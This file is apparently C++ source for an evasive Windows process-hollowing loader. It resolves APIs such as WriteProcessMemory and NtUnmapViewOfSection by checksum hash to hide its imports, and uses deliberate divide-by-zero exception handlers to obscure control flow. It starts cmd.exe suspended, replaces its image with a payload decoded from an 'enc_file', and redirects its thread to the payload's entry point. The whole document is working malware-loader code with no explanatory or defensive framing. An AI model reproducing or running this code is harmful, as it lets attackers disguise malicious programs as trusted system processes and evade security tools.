#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "definitions.h"
#include "bigindex.h"
#include <string>


class ObfuscateFunction {

private:

    LPVOID arr_of_func[14];
    UINT64 api_constants[14];

    UINT32 fletcher32(UINT16 const* data, size_t len)
    {
        UINT32 sum1 = 0xffff, sum2 = 0xffff;

        while (len) {
            unsigned tlen = len > 359 ? 359 : len;

            len -= tlen;

            do {
                sum1 += *data++;
                sum2 += sum1;
            } while (--tlen);

            sum1 = (sum1 & 0xffff) + (sum1 >> 16);
            sum2 = (sum2 & 0xffff) + (sum2 >> 16);
        }
        /* Second reduction step to reduce sums to 16 bits */
        sum1 = (sum1 & 0xffff) + (sum1 >> 16);
        sum2 = (sum2 & 0xffff) + (sum2 >> 16);
        return (sum2 << 16 | sum1);
    }

    LPVOID search_exp(char* lib_name, UINT32 hash, int len, int sumhash)
    {
        PIMAGE_DOS_HEADER       dos;
        PIMAGE_NT_HEADERS       nt;
        DWORD                   cnt, rva, dll_h;
        PIMAGE_DATA_DIRECTORY   dir;
        PIMAGE_EXPORT_DIRECTORY exp;
        PDWORD                  adr;

        PDWORD                  sym;
        PWORD                   ord;
        PCHAR                   api, dll;
        LPVOID                  api_adr = NULL;


        HMODULE base = LoadLibraryA(lib_name);

        dos = (PIMAGE_DOS_HEADER)base;
        nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
        dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
        rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        // if no export table, return NULL
        if (rva == 0) return NULL;

        exp = (PIMAGE_EXPORT_DIRECTORY)RVA2VA(ULONG_PTR, base, rva);
        cnt = exp->NumberOfNames;

        // if no api, return NULL
        if (cnt == 0) return NULL;

        adr = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
        sym = RVA2VA(PDWORD, base, exp->AddressOfNames);
        ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
        dll = RVA2VA(PCHAR, base, exp->Name);
        //printf(dll);
        // calculate hash of DLL string

        do {
            // calculate hash of api string
            api = RVA2VA(PCHAR, base, sym[cnt - 1]);
            UINT16 as_ints[100];
            int i = 0, j = 0;
            for (i = 0; i <= strlen(api); i++) {
                as_ints[i] = api[i];
                j += api[i];
            };
            as_ints[i] = '\0';
            //api contains the api name
            UINT32 f = fletcher32(as_ints, strlen(api));
            /*if (strcmp(api,"NtQueryInformationProcess") == 0 || strcmp(api,"NtUnmapViewOfSection") == 0) {
                printf("\nA: %s %#x %d",api,f,j);
            */
            if (f == hash && strlen(api) == len && j == sumhash) {
                //printf("\nB: %s %d %#x", api, j, f);
                api_adr = GetProcAddress(base, api);
                break;
            }
        } while (--cnt && api_adr == 0);
        return api_adr;
    };
    
public:
    
    LPVOID GetFunction(int idx) {
        ObfuscateFunction();
        return this->arr_of_func[idx];
    }

    ObfuscateFunction() {
        api_constants[0]  = 0x5740e28ab0574;
        api_constants[1]  = 0xa3d1983290a3d;
        api_constants[2]  = 0x7e81451c207e8;
        api_constants[3]  = 0x58f0e2a0a058f;
        api_constants[4]  = 0x76312450c0763;
        api_constants[5]  = 0x6d4113b6306d4;
        api_constants[6]  = 0x65d103430065d;
        api_constants[7]  = 0x6691034f00669;
        api_constants[8]  = 0x4c90c1f1204c9;
        api_constants[9]  = 0x4150b18c50415;
        api_constants[10] = 0x43b0b1883043b;
        api_constants[11] = 0x3690910710369;
        api_constants[12] = 0x57d0e288b057d;
        api_constants[13] = 0x2fc080d1d02fc;

        for (int i = 0; i < 14; i++) {
            if (i == 1 || i == 2) {
                arr_of_func[i] = search_exp((char*)"ntdll.dll", api_constants[i] & 0xffffffff, (api_constants[i] >> 32) & 0xff, (api_constants[i] >> 40) & 0xfff);
            }
            else {
                arr_of_func[i] = search_exp((char*)"kernel32.dll", api_constants[i] & 0xffffffff, (api_constants[i] >> 32) & 0xff, (api_constants[i] >> 40) & 0xfff);
            }
        }


        //"kernel32.dll", 0x28ab0574, 14, 1396,  CreateProcessA
        //"ntdll.dll", 0x83290a3d, 25, 2621,  NtQueryInformationProcess
        //"ntdll.dll", 0x51c207e8, 20, 2024,  NtUnmapViewOfSection
        //"kernel32.dll", 0x2a0a058f, 14, 1423,  VirtualAllocEx
        //"kernel32.dll", 0x450c0763, 18, 1891,  WriteProcessMemory
        //"kernel32.dll", 0x3b6306d4, 17, 1748,  ReadProcessMemory
        //"kernel32.dll", 0x3430065d, 16, 1629,  GetThreadContext
        //"kernel32.dll", 0x34f00669, 16, 1641,  SetThreadContext
        //"kernel32.dll", 0x1f1204c9, 12, 1225,  ResumeThread
        //"kernel32.dll", 0x18c50415, 11, 1045,  CreateFileA
        //"kernel32.dll", 0x1883043b, 11, 1083,  GetFileSize
        //"kernel32.dll", 0x10710369, 9, 873 ,  HeapAlloc
        //"kernel32.dll", 0x288b057d, 14, 1405,  GetProcessHeap
        //"kernel32.dll", 0xd1d02fc, 8, 764 ,  ReadFile
    }

};

class TargetProcess : public ObfuscateFunction{

private:
    char TargetProcessName[100];
    HANDLE TargetHandle;
    HANDLE TargetThread;
    UINT_PTR TargetPEBAddress;
    LPVOID TargetImageBase;


public:
    char* GetTargetProcessName() {
        return TargetProcessName;
    }
    
    void SetTargetProcessName(const char* ProcName) {
        strncpy_s(this->TargetProcessName, ProcName, strlen(ProcName));
    }

    HANDLE GetTargetHandle() {
        return TargetHandle;
    }

    HANDLE GetTargetThread() {
        return TargetThread;
    }

    UINT_PTR GetTargetPEBAddress() {
        return TargetPEBAddress;
    }

    LPVOID GetTargetImageBase() {
        return TargetImageBase;
    }

    void SetTargetImageBase() {
        LPVOID ImageBase = NULL;
        SIZE_T bytesRead = NULL;
        myReadProcessMemory fnReadProcessMemory = (myReadProcessMemory)GetFunction(5);
        fnReadProcessMemory(this->GetTargetHandle(), (LPVOID)this->GetTargetPEBAddress(), &ImageBase, 8, &bytesRead);
        this->TargetImageBase = ImageBase;
    }

    void SetTargetImageBase(LPVOID ImageBase) {
        this->TargetImageBase = ImageBase;
    }

    TargetProcess() {}

    TargetProcess(const char* ProcName, HANDLE pHandle,HANDLE tHandle, UINT_PTR pebAddress) {
        SetTargetProcessName(ProcName);
        this->TargetHandle = pHandle;
        this->TargetThread = tHandle;
        this->TargetPEBAddress = pebAddress;
    }
};

class SourceProcess {

private:
    char SourceProcessName[100];
    LPVOID SourceProcessBuffer;
    SIZE_T SourceProcessSize;
    PIMAGE_DOS_HEADER SourceImageDOSHeaders;
    PIMAGE_NT_HEADERS SourceImageNTHeaders;
    SIZE_T SourceImageSize;

public:

    char* GetSourceProcessName() {
        return SourceProcessName;
    }
    
    void SetSourceProcessName(char* ProcName) {
        strncpy_s(this->SourceProcessName, ProcName, strlen(ProcName));
    }

    void SetImageInfo() {
        SourceImageDOSHeaders = (PIMAGE_DOS_HEADER)this->SourceProcessBuffer;
        SourceImageNTHeaders  = (PIMAGE_NT_HEADERS)((ULONGLONG)this->SourceProcessBuffer + SourceImageDOSHeaders->e_lfanew);
        SourceImageSize       = this->SourceImageNTHeaders->OptionalHeader.SizeOfImage;
    }

    LPVOID GetSourceProcessBuffer() {
        return SourceProcessBuffer;
    }

    PIMAGE_NT_HEADERS GetSourceImageNTHeaders() {
        return SourceImageNTHeaders;
    }

    PIMAGE_DOS_HEADER GetSourceImageDOSHeaders() {
        return SourceImageDOSHeaders;
    }

    SIZE_T GetSourceImageSize() {
        return SourceImageSize;
    }

    SourceProcess() {}

    SourceProcess(const char* ProcName, LPVOID ProcessBuffer, SIZE_T ProcessSize) {
        strncpy_s(this->SourceProcessName, ProcName, strlen(ProcName));
        this->SourceProcessBuffer = ProcessBuffer;
        this->SourceProcessSize = ProcessSize;
    }
};

class ProcessHollowing : public ObfuscateFunction {

private:
    ULONGLONG DeltaImageBase;

public:

    TCHAR* GetProcessName() {
        TCHAR current_proc_name[MAX_PATH];
        GetModuleFileName(NULL, current_proc_name, MAX_PATH);
        return current_proc_name;
    }

    unsigned long long* _ReadFile() {
        std::fstream file;
        file.open("enc_file", std::ios::in);
        std::vector<int> vlist;
        int source_size = 0;
        file >> std::hex >> source_size;
        int enc_size = 0, tmp = 0;
        file >> std::hex >> enc_size;
        int total_size = source_size + enc_size;
        for (int i = 0; i < total_size; i++) {
            file >> std::hex >> tmp;
            vlist.push_back(tmp);
        }
        file.close();
        myGetProcessHeap fnGetProcessHeap = (myGetProcessHeap)GetFunction(12);
        myHeapAlloc fnHeapAlloc = (myHeapAlloc)GetFunction(11);
        LPVOID FileBuffer = fnHeapAlloc(fnGetProcessHeap(), HEAP_ZERO_MEMORY, source_size);
        unsigned char* buf_ptr = (unsigned char *)FileBuffer;

        std::set<int> dec_list = GetIndex();
        int j = 0;
        for (int i = 0; i < total_size; i++) {
            if (j > source_size)
                break;
            if (!dec_list.count(i)) {
                *buf_ptr++ = vlist[i];
                j++;
            }
        }
        ///* Debug Start */
        //buf_ptr = (unsigned char*)FileBuffer;
        //file.open("output", std::ios::binary | std::ios::out);
        //for (int i = 0; i < source_size; i++) {
        //    file << *buf_ptr++;
        //}
        //file.close();
        ///* Debug End */

        unsigned long long res[] = { (unsigned long long)FileBuffer, source_size };

        return res;
    }

    ULONGLONG GetDeltaImageBase() {
        return DeltaImageBase;
    }

    void SetDeltaImageBase(ULONGLONG DltImgBase) {
        this->DeltaImageBase = DltImgBase;
    }

    TargetProcess CreateTargetProcess(const char* ProcName) {
        LPSTARTUPINFOA si = new STARTUPINFOA();
        LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
        myCreateProcessA fnCreateProcessA = (myCreateProcessA)ObfuscateFunction::GetFunction(0);
        fnCreateProcessA(NULL, (LPSTR)ProcName, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
        
        ULONG RequiredLen = 0;
        PROCESS_BASIC_INFORMATION myProcessBasicInformation[5] = { 0 };
        myNtQueryInformationProcess fnNtQueryInformationProcess = (myNtQueryInformationProcess)ObfuscateFunction::GetFunction(1);
        fnNtQueryInformationProcess(pi->hProcess, 0, myProcessBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &RequiredLen);
        UINT_PTR TargetPEBAddress = (UINT_PTR)myProcessBasicInformation->PebBaseAddress + 16;
        
        return TargetProcess(ProcName, pi->hProcess, pi->hThread, TargetPEBAddress);
    }

    SourceProcess CreateSourceProcess(const char* ProcName) {
        myCreateFile fnCreateFile = (myCreateFile)GetFunction(9);
        HANDLE sourceFile = fnCreateFile(ProcName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);

        myFileSize fnFileSize = (myFileSize)GetFunction(10);
        SIZE_T sourceFileSize = fnFileSize(sourceFile, NULL);
        
        myGetProcessHeap fnGetProcessHeap = (myGetProcessHeap)GetFunction(12);
        myHeapAlloc fnHeapAlloc = (myHeapAlloc)GetFunction(11);
        LPVOID ProcessBuffer = fnHeapAlloc(fnGetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
        
        myReadFile fnReadFile = (myReadFile)GetFunction(13);
        fnReadFile(sourceFile, ProcessBuffer, sourceFileSize, NULL, NULL);

        CloseHandle(sourceFile);

        unsigned long long* res = _ReadFile();
        ProcessBuffer = (LPVOID)res[0];
        sourceFileSize = res[1];

        return SourceProcess(ProcName, ProcessBuffer, sourceFileSize);
    }

    void CopySrcSecToTrgSec(TargetProcess objTrgProc, SourceProcess objSrcProc, PIMAGE_SECTION_HEADER SrcImgSec) {
        for (int i = 0; i < objSrcProc.GetSourceImageNTHeaders()->FileHeader.NumberOfSections; i++)
        {
            PVOID destinationSectionLocation = (PVOID)((ULONGLONG)objTrgProc.GetTargetImageBase() + SrcImgSec->VirtualAddress);
            PVOID sourceSectionLocation = (PVOID)((ULONGLONG)objSrcProc.GetSourceProcessBuffer() + SrcImgSec->PointerToRawData);
            myWriteProcessMemory fnWriteProcessMemory = (myWriteProcessMemory)GetFunction(4);
            fnWriteProcessMemory(objTrgProc.GetTargetHandle(), destinationSectionLocation, sourceSectionLocation, SrcImgSec->SizeOfRawData, NULL);
            SrcImgSec++;
        }
    }

    void PatchRelocations(TargetProcess objTrgProc, SourceProcess objSrcProc, PIMAGE_SECTION_HEADER SrcImgSec, IMAGE_DATA_DIRECTORY RelocTable) {
        for (int i = 0; i < objSrcProc.GetSourceImageNTHeaders()->FileHeader.NumberOfSections; i++)
        {
            BYTE* relocSectionName = (BYTE*)".reloc";
            if (memcmp(SrcImgSec->Name, relocSectionName, 5) != 0)
            {
                SrcImgSec++;
                continue;
            }

            ULONGLONG sourceRelocationTableRaw = SrcImgSec->PointerToRawData;
            DWORD relocationOffset = 0;

            while (relocationOffset < RelocTable.Size) {
                PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((ULONGLONG)objSrcProc.GetSourceProcessBuffer() + sourceRelocationTableRaw + relocationOffset);
                relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
                DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
                PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((ULONGLONG)objSrcProc.GetSourceProcessBuffer() + sourceRelocationTableRaw + relocationOffset);

                for (DWORD y = 0; y < relocationEntryCount; y++)
                {
                    relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

                    if (relocationEntries[y].Type == 0)
                    {
                        continue;
                    }

                    ULONGLONG patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
                    ULONGLONG patchedBuffer = 0;
                    SIZE_T bytesRead = NULL;
                    myReadProcessMemory fnReadProcessMemory = (myReadProcessMemory)GetFunction(5);
                    fnReadProcessMemory(objTrgProc.GetTargetHandle(), (LPCVOID)((ULONGLONG)objTrgProc.GetTargetImageBase() + patchAddress), &patchedBuffer, sizeof(ULONGLONG), &bytesRead);
                    patchedBuffer += this->DeltaImageBase;
                    myWriteProcessMemory fnWriteProcessMemory = (myWriteProcessMemory)GetFunction(4);
                    fnWriteProcessMemory(objTrgProc.GetTargetHandle(), (PVOID)((ULONGLONG)objTrgProc.GetTargetImageBase() + patchAddress), &patchedBuffer, sizeof(ULONGLONG), NULL);
                }
            }
        }
    }
};

void FuncProcHollow(TargetProcess objTrgProc, SourceProcess objSrcProc, ObfuscateFunction objObfFunc, ProcessHollowing objProcHollw)
{
        __try {
            int f = 20;
            int x = 80;
            int c = (int)(x * f) / 0;

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {

            myNtUnmapViewOfSection fnNtUnmapViewOfSection = (myNtUnmapViewOfSection)objObfFunc.GetFunction(2);
            fnNtUnmapViewOfSection(objTrgProc.GetTargetHandle(), objTrgProc.GetTargetImageBase());

            myVirtualAllocEx fnVirtualAllocEx = (myVirtualAllocEx)objObfFunc.GetFunction(3);
            LPVOID newDestImageBase = fnVirtualAllocEx(objTrgProc.GetTargetHandle(), objTrgProc.GetTargetImageBase(), objSrcProc.GetSourceImageSize(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            objTrgProc.SetTargetImageBase(newDestImageBase);

            objProcHollw.SetDeltaImageBase((ULONGLONG)objTrgProc.GetTargetImageBase() - objSrcProc.GetSourceImageNTHeaders()->OptionalHeader.ImageBase);

            objSrcProc.GetSourceImageNTHeaders()->OptionalHeader.ImageBase = (ULONGLONG)objTrgProc.GetTargetImageBase();
            myWriteProcessMemory fnWriteProcessMemory = (myWriteProcessMemory)objObfFunc.GetFunction(4);
            fnWriteProcessMemory(objTrgProc.GetTargetHandle(), newDestImageBase, objSrcProc.GetSourceProcessBuffer(), objSrcProc.GetSourceImageNTHeaders()->OptionalHeader.SizeOfHeaders, NULL);

            PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((ULONGLONG)objSrcProc.GetSourceProcessBuffer() + objSrcProc.GetSourceImageDOSHeaders()->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
            PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
            
            objProcHollw.CopySrcSecToTrgSec(objTrgProc, objSrcProc, sourceImageSection);

            IMAGE_DATA_DIRECTORY relocationTable = objSrcProc.GetSourceImageNTHeaders()->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            objProcHollw.PatchRelocations(objTrgProc, objSrcProc, sourceImageSectionOld, relocationTable);

            LPCONTEXT context = new CONTEXT();
            context->ContextFlags = CONTEXT_INTEGER;
            myGetThread fnGetThread = (myGetThread)objObfFunc.GetFunction(6);
            fnGetThread(objTrgProc.GetTargetThread(), context);

            ULONGLONG patchedEntryPoint = (ULONGLONG)objTrgProc.GetTargetImageBase() + objSrcProc.GetSourceImageNTHeaders()->OptionalHeader.AddressOfEntryPoint;
            context->Rcx = patchedEntryPoint;

            mySetThread fnSetThread = (mySetThread)objObfFunc.GetFunction(7);
            fnSetThread(objTrgProc.GetTargetThread(), context);

            myResumeThread fnResumeThread = (myResumeThread)objObfFunc.GetFunction(8);
            fnResumeThread(objTrgProc.GetTargetThread());
        }
}

void ExceptionMain(TargetProcess objTrgProc, SourceProcess objSrcProc, ProcessHollowing objProcHollw, ObfuscateFunction objObfFunc) {
    __try
    {
        int a = 10;
        int b = 0;
        int c = a / b;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        objObfFunc = ObfuscateFunction();
        objProcHollw = ProcessHollowing();
        objTrgProc = objProcHollw.CreateTargetProcess("c:\\windows\\system32\\cmd.exe");

        objSrcProc = objProcHollw.CreateSourceProcess("enc_file");

        objTrgProc.SetTargetImageBase();

        objSrcProc.SetImageInfo();
    }

    FuncProcHollow(objTrgProc, objSrcProc, objObfFunc, objProcHollw);
}

int main()
{
    ObfuscateFunction objObfFunc;
    ProcessHollowing objProcHollw;
    TargetProcess objTrgProc;
    SourceProcess objSrcProc;
    
    ExceptionMain(objTrgProc, objSrcProc, objProcHollw, objObfFunc);

    return 0;
}